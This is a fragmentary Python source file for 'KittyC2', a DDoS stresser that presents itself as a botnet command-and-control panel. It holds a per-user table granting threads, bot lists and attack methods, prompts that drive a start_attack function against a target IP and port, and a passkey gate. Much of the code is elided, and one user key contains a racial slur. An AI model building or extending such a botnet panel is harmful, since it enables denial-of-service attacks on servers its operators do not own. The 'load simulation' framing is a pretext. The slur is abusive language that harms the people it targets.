...
ef02188849911bfcec6da03afb = {
    ...
    "niggerboo764": {"threads": 999999, "max_active_bots": len(bot_ipv4_list), "methods": list(GLOBAL_METHODS)},
}

""
...
def show_methods():
    ...
    print()
    choice = input(accent("kitty@kittyC2 ~  ")).strip()
    if choice == "1":
...
def start_attack(ip, port, duration, method, threads=299, request_type="GET"):
    ...
    while True:
        mode_choice = input(accent("kitty@kittyc2 ~  ")).strip()
...
"""))
        ...
        opt = input(accent("kitty@kittyc2 ~  ")).strip()
...
def about_screen():
    ...
    print(grey(".  ─── = DDosed by a kitty = ───  ."))
    print(grey(" - KittyC2 is a versatile DDoS stresser tool for simulating network loads, compatible with Android, iPhone, and Linux devices."))
...
if __name__ == "__main__":
    clear_screen()
    print(accent(" ᓚᘏᗢ KITTYC2 STRESSER"))
    if valid_passkey():
        main_menu()
    else:
        print(accent("Invalid passkey."))
